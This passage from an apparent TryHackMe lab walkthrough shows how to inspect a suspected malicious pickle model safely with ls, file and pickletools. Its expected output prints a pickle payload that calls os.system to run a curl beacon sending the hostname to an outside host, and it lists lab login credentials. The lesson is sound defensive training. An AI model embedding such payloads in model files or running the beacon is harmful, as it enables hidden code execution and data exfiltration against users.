## 02 - Investigating a Malicious Model

Now it's time to apply the above to a lab. TryTrainMe's AI-powered code reviewer uses a model called code_reviewer.pkl. The CEO's email claims this model is compromised. **Your job: investigate it safely.**

> Credentials
> only needed if you're using your own machine.
> Username - analyst, Password - analyst123, IP address - MACHINE_IP, Connection via SSH - ssh analyst@MACHINE_IP

#### Lab Directory Structure

    analyst@tryhackme-2204:~$ ls -la /opt/supply-chain total 32
    drwxr-xr-x 8 analyst analyst 4096 Mar  3 02:57 .
    drwxr-xr-x 3 root    root    4096 Mar  3 02:57 ..
    drwxr-xr-x 5 analyst analyst 4096 Mar  3 02:57
    auditdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57
    dependenciesdrwxr-xr-x 6 analyst analyst 4096 Mar  3 02:57
    incidentdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57
    modelsdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57
    projectdrwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 tools

#### Step 1: Examine File Properties

Start by checking the basic properties of the model files:

    analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl

**Expected Output:**

    -rwxr-xr-x 1 analyst analyst 8.1M Mar  3 02:57 /opt/supply-chain/models/code_reviewer.pkl
    -rwxr-xr-x 1 analyst analyst 2.0M Mar  3 02:57 /opt/supply-chain/models/code_reviewer_v1.pkl

The suspicious model is four times larger than the clean model. This size difference alone does not prove malice, but it is worth noting.

**Check the file types:

    analyst@tryhackme-2204:~$ file /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl

**Expected Output**

    /opt/supply-chain/models/code_reviewer.pkl:    data
    /opt/supply-chain/models/code_reviewer_v1.pkl: data

Both show as generic "data". The file command cannot distinguish a malicious pickle from a clean one. We need a deeper inspection.

#### Step 2: Inspect With pickletools (Safe)

Python includes a built-in module called **pickletools** that disassembles pickle files without executing them. This is the safe way to inspect pickle contents.

Keep in mind: Never use **pickle.load()** on untrusted files. It will execute any embedded code immediately.


Run pickletools on the suspecious model

    analyst@tryhackme-2204:~$ python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&1 | head -30


**Expected output**


    0: \x80 PROTO      4
    2: \x95 FRAME      72
    11: \x8c SHORT_BINUNICODE 'os'
    15: \x94 MEMOIZE    (as 0)
    16: \x8c SHORT_BINUNICODE 'system'
    24: \x94 MEMOIZE    (as 1)
    25: \x93 STACK_GLOBAL
    26: \x94 MEMOIZE    (as 2)
    27: \x8c SHORT_BINUNICODE 'curl http://[REDACTED]/beacon?host=$(hostname)'
    77: \x94 MEMOIZE    (as 3)
    78: \x85 TUPLE1
    79: \x94 MEMOIZE    (as 4)
    80: R    REDUCE
    81: \x94 MEMOIZE    (as 5)
    82: .    STOP


